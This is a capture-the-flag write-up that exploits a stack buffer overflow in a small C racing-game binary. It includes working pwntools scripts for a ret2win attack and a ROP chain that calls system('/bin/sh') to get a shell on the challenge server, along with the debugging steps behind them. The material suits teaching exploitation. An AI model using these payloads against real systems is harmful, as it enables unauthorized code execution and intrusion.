# Utrka 1 (100 points) and 2 (150 points)

Utrka 1 and 2 are made in such a way that if you solve Utrka 2 you have solved
Utrka 1, however for the sake of being thorough I will go over the solutions for both.

------------
### Utrka 1

We are given the following code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char yourCar[100];
char opponentCar[100];
char track[2500];

char *yourCarLines[4];
char *opponentCarLines[4];
char *trackLines[23];

void printTrack(int pos1, int pos2);
void loadCar(char car[100]);
void loadTrack();
void prepareLines();

void lose(int pos);
void win();

int main()
{
    
    loadCar(yourCar);
    loadCar(opponentCar);
    loadTrack();
    prepareLines();
    char progress[232] = {0};
    for (int i = 0;i<3;i++){
        printTrack(strlen(progress)/5,i*23);
	fflush(stdout);
        fgets(progress+strlen(progress),101,stdin);
    }

    lose(strlen(progress)/5);

    return 0;
}

void loadCar(char car[100])
{
    FILE *f;
    char *fileName = (car == yourCar) ? "./yourCar.txt" : "./opponentCar.txt";
    f = fopen(fileName, "r");
    fread(car, 100, 1, f);
    fclose(f);
}

void loadTrack()
{
    FILE *f;
    f = fopen("./track.txt", "r");
    fread(track, sizeof track, 1, f);
    fclose(f);
}

void lose(int pos){
    printTrack(pos,78);
    printf("\nYou lose :(\n");
}

void win(){
    FILE *f;
    f = fopen("./flag.txt","r");
    char flag[100];
    fread(flag,100,1,f);
    fclose(f);
    printf("\n%s\n",flag);
    fflush(stdout);
}

void prepareLines()
{
    yourCarLines[0] = strtok(yourCar, "\n");
    for (int i = 1; i < 4; i++)
    {
        yourCarLines[i] = strtok(NULL, "\n");
    }

    opponentCarLines[0] = strtok(opponentCar, "\n");
    for (int i = 1; i < 4; i++)
    {
        opponentCarLines[i] = strtok(NULL, "\n");
    }

    trackLines[0] = strtok(track, "\n");
    for (int i = 1; i < 23; i++)
    {
        trackLines[i] = strtok(NULL, "\n");
    }
}

void printTrack(int pos1,int pos2)
{
    system("clear");
    for (int i = 0; i < 12; i++)
    {
        puts(trackLines[i]);
    }

    for (int i = 0; i < 4; i++)
    {
        printf("%.*s%s%s\n", pos1, trackLines[12 + i], yourCarLines[i], trackLines[12 + i] + pos1 + strlen(yourCarLines[i]));
    }

    for (int i = 16; i < 18;i++){
        puts(trackLines[i]);
    }

    for (int i = 0; i < 4; i++)
    {
        printf("%.*s%s%s\n", pos2, trackLines[18 + i], opponentCarLines[i], trackLines[18 + i] + pos2 + strlen(opponentCarLines[i]));
    }

    for (int i = 22; i < 23;i++){
        puts(trackLines[i]);
    }
}
```

Immediately we see that `fgets` reads input 3 times and each time it reads it, it takes 
up to 101 characters and puts them into `char progress[232]`, so taking 303 chars and putting them into a char array of 232, seems like a simple [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow).

Let's run it in gdb and see what we get when we input a cyclic pattern of length 303.

Here's how we generate our cyclic pattern.
```sh
python -c "from pwn import *; print(cyclic(303).decode('utf-8'))" > pattern
```

Since the program does a little bit trolling and calls `system("clear")` it makes debugging it a little bit annoying if you don't know what you are doing. Thankfully, you can just run it like this and it should debug fine.

```bash
gdb utrka
set follow-fork-mode parent
r < pattern
```

This is the result we get:

![gdb output](https://i.imgur.com/goMMK98.png)

*Note: I am using [pwndbg](https://github.com/pwndbg/pwndbg) which is a modified version of gdb specifically made for exploit development. I highly recommend it as it's a much better experience than using regular old gdb.*


Here we can see on the last line that when it returns from main it tries to go to the address `0x6361617263616171` which is a part of our cyclic pattern, and we can find out exactly which part like this:
```bash
python -c "from pwn import *; print(cyclic_find(0x63616171))" 
264
```

We need to put 264 characters of padding before we can overwrite the return address. 


Now let's try to do a [ret2win](https://book.hacktricks.xyz/binary-exploitation/stack-overflow/ret2win).

```python
from pwn import *

elf = ELF('./utrka')

payload = b'A' * cyclic_find(0x63616171)
payload += p64(elf.symbols['win'])

p = process('./utrka')
p.sendline(payload)
p.interactive()
```

And we get a segfault, let's see why in our debugger.

![gdb output](https://i.imgur.com/PkUOBiZ.png)

We are successfully returning to the win function, but let's try and see why does it segfault.

![gdb segfault](https://i.imgur.com/Rphw4Bw.png)

It segfaults at `movaps xmmword ptr [rsp], xmm0`, and after a bit of research I found out that this instruction will segfault if the stack isn't properly aligned. So it seems that even in this simple ret2win attack we will need to do some [return oriented programming](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing)

To realign the stack we just need to return to the `ret` instruction once more before we return to the win function, the easiest way to do that is just to return back to the end of main, if we disassemble main we can see that the `ret` instruction is located at `main+530`, so let's return to that.

```python
from pwn import *

elf = ELF('./utrka')

payload = b'A' * cyclic_find(0x63616171) # padding
payload += p64(elf.symbols['main']+530)  # realign stack frame
payload += p64(elf.symbols['win'])       # profit

p = process('./utrka')
p.sendline(payload)
p.interactive()
```

We run it locally.
```text
You lose :(

CTF2024[testing_flag]
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x97\xb2
[*] Got EOF while reading in interactive
$ 
[*] Process './utrka' stopped with exit code -11 (SIGSEGV) (pid 22239)
[*] Got EOF while sending in interactive
```

All that is left now is to run it on the server

```python
from pwn import *

elf = ELF('./utrka')

payload = b'A' * cyclic_find(0x63616171) # padding
payload += p64(elf.symbols['main']+530)  # realign stack frame
payload += p64(elf.symbols['win'])       # profit

r = remote('chal.hackultet.hr', 13015)
r.sendline(payload)
r.interactive()
```

```text
You lose :(

CTF2024[395847397764]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAp7\[*] Got EOF while reading in interactive
```

Flag acquired!

-----------------------

### Utrka 2

For Utrka 2 nothing changes except that we are told the filename of the other flag `systemOwnFlag.txt`.

To get this flag we need to get a shell, the easiest way to do that is through [ROP](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing). 

Using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) like this:

```
ROPgadget --binary utrka --ropchain
```

we can get it to generate a payload for us that would automatically give us a shell, unfortunately it isn't that easy. We are quite limited by space so we are gonna have to craft our own ropchain and one that can fit into our
relatively small buffer overflow.

Our way to a shell is through the [system](https://en.cppreference.com/w/c/program/system) function. It takes a pointer to a string into the `rdi` register and runs that string as a shell command.
We want to give it the location for the `/bin/sh` string in order to get a shell.

Let's first check if it is in our binary with this

```
strings utrka | grep /bin/sh
/bin/sh
```

Now we need a way to get the location of that string into the `rdi` register. We need a `pop rdi` gadget
```
ROPgadget --binary utrka | grep 'pop rdi ; ret'
0x00000000004880fb : add al, ch ; pop rdi ; retf 0xfff7
0x000000000040256f : pop rdi ; ret
0x00000000004880fd : pop rdi ; retf 0xfff7
```

Looks like that is in here as well, and since another function already calls `system` we don't need to worry about if it is in the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) or not.

Time to craft our exploit, and just as before we are going to have to align the stack frame before calling system.

```python
from pwn import *

elf = ELF('./utrka')
rop = ROP(elf)

payload = b'A' * cyclic_find(0x63616171)                     # padding
payload += p64(rop.find_gadget(['pop rdi', 'ret']).address)  # pop address of /bin/sh into rdi
payload += p64(next(elf.search(b'/bin/sh')))                 # address of /bin/sh
payload += p64(rop.find_gadget(['ret']).address)             # align stack frame
payload += p64(elf.symbols['system'])                        # profit

p = process('./utrka')
p.sendline(payload)
p.interactive()
```

```text
                                                              ||\
                                                              || \
                                                              ||  \
                                                              ||   \
                                                              ||    \
                                                              ||     \
                                                              ||\     \
                                                              || \  F  \
                                                              ||  \  L  \
                                                              ||   \  A  \        
                                                              ||    \  G  \       
______________________________________________________________||_____\     \________________________
                                                       ______         \    ||                       
                                                      /|_||_\`.__      \   ||                       
                                                     (   _    _ _\      \  ||                       
                                                     =`-(_)--(_)-'       \ ||                        
__    ____    ____     ____       ____        ______        _________     \||_________       __________
                                                                           ||                         
                                                                           ||    _-_-  _/\______\\__   
                                                                           || _-_-__  / ,-. -|-  ,-.`-.
                                                                           ||    _-_- `( o )----( o )-' 
                                                                           ||           `-'      `-'     
 __________________________________________________________________________||______________________________  

You lose :(
$ ls
exploit1.py  flag.txt          pattern  track.txt  utrka.c
exploit2.py  opponentCar.txt  payload  utrka      yourCar.txt
$ 
```

It worked, now to run it on the server.

```
$ ls
busybox
flag.txt
opponentCar.txt
systemOwnFlag.txt
track.txt
utrka
yourCar.txt
$ cat systemOwnFlag.txt
CTF2024[223653716405]$ 
```

Easy.


-----------------------
Useful resources:

[ret2win (hacktricks)](https://book.hacktricks.xyz/binary-exploitation/stack-overflow/ret2win)

[Buffer Overflows can Redirect Program Execution - bin 0x0D (live overflow on youtube)](https://www.youtube.com/watch?v=8QzOC8HfOqU)
  
[ret2lib (hacktricks)](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib)

[Doing ret2libc with a Buffer Overflow because of restricted return pointer - bin 0x0F (live overflow on youtube)](https://www.youtube.com/watch?v=m17mV24TgwY)

[ret2libc attack MOVAPS segfault (stack overflow)](https://stackoverflow.com/questions/75104277/ret2libc-attack-movaps-segfault)
